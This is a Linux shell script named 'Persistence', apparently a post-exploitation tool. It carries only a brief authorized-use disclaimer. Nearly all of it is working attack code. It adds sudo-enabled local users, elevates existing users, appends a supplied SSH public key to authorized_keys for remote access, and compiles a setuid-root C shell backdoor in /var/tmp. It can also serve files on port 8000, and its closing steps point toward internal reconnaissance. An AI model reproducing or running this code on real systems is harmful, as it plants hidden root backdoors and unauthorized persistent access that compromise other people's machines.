#!/bin/sh
# Persistence

####################
# Global variables #
####################

# colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC="\033[0m" # No Color
# bold
BRED='\033[1;31m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
BBLUE='\033[1;34m'
# text
BOLD=$(tput bold)
NORMAL='\033[0;39m'


#############
# Functions #
#############

# Print banner
print_banner() {
# http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something
echo "
  ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
 |  _ \| ____|  _ \/ ___|_ _/ ___|_   _| ____| \ | |/ ___| ____|
 | |_) |  _| | |_) \___ \| |\___ \ | | |  _| |  \| | |   |  _|  
 |  __/| |___|  _ < ___) | | ___) || | | |___| |\  | |___| |___ 
 |_|   |_____|_| \_\____/___|____/ |_| |_____|_| \_|\____|_____|                                                                
"
}

print_advisory() {
  echo
  echo "${BYELLOW}Advisory: ${BBLUE}Use this script for educational purposes and/or for authorized penetration testing only. The author is not responsible for any misuse or damage caused by this script. Use at your own risk.$NC"
  echo
}

# Print title
print_title() {
  echo
  for i in $(seq 80); do
    echo -n "$BBLUE═$NC"
  done
  echo
  echo "$BGREEN $1 $NC"
  for i in $(seq 80); do
    echo -n "$BBLUE═$NC"
  done
  echo
}

# Print info line
print_info() {
  echo
  echo "$BBLUE════$BGREEN $1 $NC"
}

# Print error line
print_error() {
  echo
  echo "$BBLUE════$BRED $1 $NC"
}

# Print results line
print_result() {
  echo
  echo "$BBLUE════$BYELLOW $1 $NC"
}

# Print next steps line
print_step() {
  echo
  echo "$BBLUE[X]$NC $1 $NC"
}

# Print message line
print_message() {
  echo "$BBLUE----$NC $1 $NC"
}

# Print attention message line
print_attention() {
  echo "$BLUE----$YELLOW $1 $NC"
}

# Check for root permissions
check_root() {
print_info "Checking for root"
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  print_message "You are root"
  echo
else
  IAMROOT=""
  print_message "You are not root"
  echo
fi
}


#####################################
# Check the command line parameters #
#####################################

PASSED_ARGS=$@
if [ "$PASSED_ARGS" != "" ]; then
  while getopts "h?e:rs:u:p:qw" opt; do
    case "$opt" in
      h|\?)
        echo
        echo "Usage: $0 [options]"
        echo
        echo "Options:"
        echo "-h                Show this help message"
        echo "-e <username>     Elevate privileges of the given user"
        echo "                  Root needed!"
        echo "-r                Create a root shell"
        echo "                  Root needed!"
        echo "-s <ssh pub key>  Trying to add ssh public key to authorized_keys of current user"
        echo "                  Put the contents of your public key in quotes like: -s \"ssh-rsa AAAAB3NcaDkL......\""
        echo "-u <username>     Add a local account/user"
        echo "                  Only useful in combination with -p parameter"
        echo "                  Root needed!"
        echo "-p <password>     Set this password to new or existent user"
        echo "                  Root needed!"
        echo "-w                Serves a local web server for transferring files"
        echo
        echo "Output:"
        echo "-q                Quiet. No banner and no advisory displayed"
        echo
        exit;;
      e) ELEVATEPRIV="1";PRIVUSER=$OPTARG;;
      r) ROOTSHELL="1";;
      s) SSH="1";PUBKEY=$OPTARG;;
      u) ADDUSER="1";USERNAME=$OPTARG;;
      p) ADDPW="1";PW=$OPTARG;;
      w) SERVE="1";QUIET="1";;
      q) QUIET="1";;
      esac
  done
else
  echo "$0: no arguments passed to script. Try -h for help."
  echo
  exit
fi

# validate OPTARG 
# todo


#########################################
# Banner, Advisory, Check for root, ... #
#########################################

if [ ! "$QUIET" ]; then
  print_banner
  print_advisory
  check_root
fi
sleep 1


#################
# Local Account #
#################

add_user() {

if [ ! "$QUIET" ]; then echo "
    _       _     _   _                    _      _                             _   
   / \   __| | __| | | |    ___   ___ __ _| |    / \   ___ ___ ___  _   _ _ __ | |_ 
  / _ \ / _\` |/ _\` | | |   / _ \ / __/ _\` | |   / _ \ / __/ __/ _ \| | | | '_ \| __|
 / ___ \ (_| | (_| | | |__| (_) | (_| (_| | |  / ___ \ (_| (_| (_) | |_| | | | | |_ 
/_/   \_\__,_|\__,_| |_____\___/ \___\__,_|_| /_/   \_\___\___\___/ \__,_|_| |_|\__|
"
fi

# check for root
if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi

# check -p parameter
if [ ! "$ADDPW" ]; then print_error "Aborting! No password given. You cannot login to that user until you set a password. Use the -p parameter" && echo && exit; fi

# check if /bin/bash exists
if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

print_title "Trying to add the user \"$USERNAME\" with root privileges ..."
sleep 2
if [ "$(command -v useradd 2>/dev/null)" ]; then
#if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
  if [ "$BASH" ]; then
    if useradd -m -s /bin/bash $USERNAME 2>/dev/null; then
      ADDUSEROK="1" && print_info "user \"$USERNAME\" added"
    else
      ADDUSEROK="" && print_error "unable to add user \"$USERNAME\"."
    fi
  else
    if useradd -m -s /bin/sh $USERNAME 2>/dev/null; then
      ADDUSEROK="1" && print_info "user \"$USERNAME\" added"
    else
      ADDUSEROK="" && print_error "unable to add user \"$USERNAME\"."
    fi
  fi
else
  print_error "command \"useradd\" not found"
fi

# add user to sudo group
if [ "$ADDUSEROK" ]; then
  print_title "Trying to add user \"$USERNAME\" to sudo group ..."
  sleep 2
  if [ "$(command -v usermod 2>/dev/null)" ]; then
    if usermod -a -G sudo $USERNAME 2>/dev/null; then
      print_info "user \"$USERNAME\" added to sudo group"
    else
      print_error "unable to add user \"$USERNAME\" to sudo group"
    fi
  else
    print_error "command \"usermod\" not found"
  fi
fi

# add password to given user
if id -u $USERNAME 2>/dev/null; then
  print_title "Trying to add a password to user \"$USERNAME\" ..."
  sleep 2
  if [ "$ADDPW" ]; then
    if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then
      if echo "$USERNAME:$PW" | sudo chpasswd 1>/dev/null 2>&1; then
        print_info "given password added to user \"$USERNAME\""
      else
        print_error "unable to add the password to given user \"$USERNAME\""
      fi
    else
      if printf "$PW\n$PW" | sudo passwd $USERNAME 1>/dev/null 2>&1; then
        print_info "given password added to user \"$USERNAME\""
      else
        print_error "unable to add the password to given user \"$USERNAME\""
      fi
    fi
  fi
fi

}

######################
# Elevate Privileges #
######################

elevate_privileges() {

if [ ! "$QUIET" ]; then echo "
 _____ _                 _         ____       _       _ _                      
| ____| | _____   ____ _| |_ ___  |  _ \ _ __(_)_   _(_) | ___  __ _  ___  ___ 
|  _| | |/ _ \ \ / / _\` | __/ _ \ | |_) | '__| \ \ / / | |/ _ \/ _\` |/ _ \/ __|
| |___| |  __/\ V / (_| | ||  __/ |  __/| |  | |\ V /| | |  __/ (_| |  __/\__ \.
|_____|_|\___| \_/ \__,_|\__\___| |_|   |_|  |_| \_/ |_|_|\___|\__, |\___||___/
                                                                |___/           
"
fi

# check for root
if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi

print_title "Trying to add user \"$PRIVUSER\" to sudo group ..."
sleep 2
# check if given user exists
if id -u $PRIVUSER 1>/dev/null 2>&1; then
  print_message "user $PRIVUSER found"
  if [ "$(command -v usermod 2>/dev/null)" ]; then
    # add user to sudo group
    if usermod -a -G sudo $PRIVUSER 2>/dev/null; then
      ELEVATEPRIVOK="1" && print_info "user \"$PRIVUSER\" added to sudo group"
    else
      ELEVATEPRIVOK="" && print_error "unable to add user \"$PRIVUSER\" to sudo group."
    fi
  else
    print_error "command \"usermod\" not found"
  fi
else
  print_error "user $PRIVUSER not found"
fi

}


############
# SSH Keys #
############

modify_ssh_keys() {

if [ ! "$QUIET" ]; then echo "
   __  __           _ _  __         ____ ____  _   _   _  __                      
  |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
  | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
  | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  
  |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ 
                            |___/                               |___/             
"
fi

# check for root
if [ "$IAMROOT" ]; then print_error "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\"" && echo && exit; fi

# check if local ssh server is running
print_title "Check if local ssh server is running ..."
sleep 2
if ps aux 1>/dev/null 2>&1 | grep sshd | grep -v grep; then
  print_message "Local ssh server is running"
elif netstat -plant 1>/dev/null 2>&1 | grep :22 | grep LISTEN; then
  print_message "Local ssh server is listening on port 22"
else
  print_error "Probably no ssh server running on this host"
fi

# set current user to $USER
if command -v whoami 1>/dev/null 2>&1; then
  USER=$(whoami 2>/dev/null)
else
  print_error "command \"whoami\" not found"
fi

# check if $HOME variable is set
if [ ! "$HOME" ]; then
  if [ -d "/home/$USER" ]; then
    HOME="/home/$USER"
  fi
fi

# get local ip addresses
LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")

print_title "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
sleep 2
if [ -d "$HOME/.ssh" ]; then
  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && print_error "unable to write authorized_keys" && TRYCHMOD="1"; fi
  if [ "$TRYCHMOD" ]; then
    if [ "$(command -v chmod 2>/dev/null)" ]; then
      chmod 700 "$HOME"/.ssh 2>/dev/null
      echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && print_info "authorized_keys updated"
    else 
      print_error "command \"chmod\" not found"
    fi
  else
    SSHOK="1" && echo "authorized_keys updated"
  fi
else
  print_info "No .ssh directory exists, creating one ..."
  if [ "$(command -v mkdir 2>/dev/null)" ]; then
    mkdir "$HOME"/.ssh 2>/dev/null && chmod 700 "$HOME"/.ssh 2>/dev/null && chmod 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
  else
    print_error "command \"mkdir\" not found"
  fi
  if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && print_info "authorized_keys updated"; else SSHOK="" && print_error "unable to write authorized_keys"; fi
fi

}


#####################
# Create root shell #
#####################

create_root_shell() {

if [ ! "$QUIET" ]; then echo "
   ____                _         ____             _     ____  _          _ _ 
  / ___|_ __ ___  __ _| |_ ___  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
 | |   | '__/ _ \/ _\` | __/ _ \ | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
 | |___| | |  __/ (_| | ||  __/ |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
  \____|_|  \___|\__,_|\__\___| |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
                                                                            
"
fi

# check for root
if [ ! "$IAMROOT" ]; then print_error "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi

TMPDIR="/var/tmp"
GCC=$(command -v gcc 2>/dev/null)
CHOWN=$(command -v chown 2>/dev/null)
CHMOD=$(command -v chmod 2>/dev/null)

# check if gcc exists
if [ "$GCC" ]; then echo "$GCC exists"; else fuERROR "gcc missing on this host, try to install it..."; fi

# check if /bin/bash exists
if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

print_title "Trying to add a shell as a binary with suid bit set ..."
sleep 2

if [ "$BASH" ]; then
  echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
else
  echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
fi
if $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null; then
  print_message "root shell \"$TMPDIR/morannon\" created"
else
  print_error "root shell not created"
fi
rm $TMPDIR/morannon.c
if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
  ROOTSHELLOK="1" && print_info "root shell \"$TMPDIR/morannon\" usable"
else
  ROOTSHELLOK="" && print_error "root shell not usable"
fi

}


##########################
# Serve local web server #
##########################

if [ "$SERVE" ]; then
  
  print_title "Serving a local web server on port 8000 ..."

  if command -v python3 1>/dev/null 2>&1; then
    python3 -m http.server 8000
  elif command -v python2 1>/dev/null 2>&1; then
    python2 -m SimpleHTTPServer 8000
  elif command -v php 1>/dev/null 2>&1; then
    php -S 0.0.0.0:8000
  else
    print_error "Aborting! Neither python nor php is installed."
  fi
fi


#############
# Run parts #
#############

# add user
if [ "$ADDUSER" ]; then add_user; elif [ "$ADDPW" ] && [ ! "$USERNAME" ]; then print_error "No username given. Try to add a user with -u parameter and combine it with -p"; fi

# elevate privs
if [ "$ELEVATEPRIV" ]; then elevate_privileges; fi

# modify ssh authorized keys
if [ "$SSH" ]; then modify_ssh_keys; fi

# create a root shell
if [ "$ROOTSHELL" ]; then create_root_shell; fi


#####################
# Summarize Results #
#####################

print_title "Following parts where successful:"

if [ "$ADDUSEROK" ]; then
  print_result "User \"$USERNAME\" added"
fi
if [ "$ELEVATEPRIVOK" ]; then
  print_result "Privilege elevation of user \"$PRIVUSER\""
fi
if [ "$SSHOK" ]; then
  print_result "Adding SSH key to authorized_keys file"
fi
if [ "$ROOTSHELLOK" ]; then
  print_result "Creation of a local root shell"
fi

echo


##############
# Next Steps #
##############
  
if [ ! "$QUIET" ]; then echo "
   _   _           _     ____  _                   _____       ____                
  | \ | | _____  _| |_  / ___|| |_ ___ _ __  ___  |_   _|__   |  _ \  ___          
  |  \| |/ _ \ \/ / __| \___ \| __/ _ \ '_ \/ __|   | |/ _ \  | | | |/ _ \         
  | |\  |  __/>  <| |_   ___) | ||  __/ |_) \__ \   | | (_) | | |_| | (_) |  _ _ _ 
  |_| \_|\___/_/\_\ __| |____/ \__\___| .__/|___/   |_|\___/  |____/ \___/  (_|_|_)
                                      |_|                                          
"
fi

if [ "$ADDUSER" ]; then
  if [ "$ADDUSEROK" ]; then
    print_step "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
  fi
fi

if [ "$ELEVATEPRIV" ]; then
  if [ "$ELEVATEPRIVOK" ]; then
    print_step "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
  fi
fi

if [ "$SSH" ]; then
  if [ "$SSHOK" ]; then
    print_step "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
    for ip in $LOCAL_IP; do
      print_step "From your Host: Try \"ssh $USER@$ip\""
    done
  fi
fi

if [ "$ROOTSHELL" ]; then
  if [ "$ROOTSHELLOK" ]; then
    print_step "A local shell was created that gives you root privileges! You can use it as follows: \"$TMPDIR/morannon\"."
  fi
fi

echo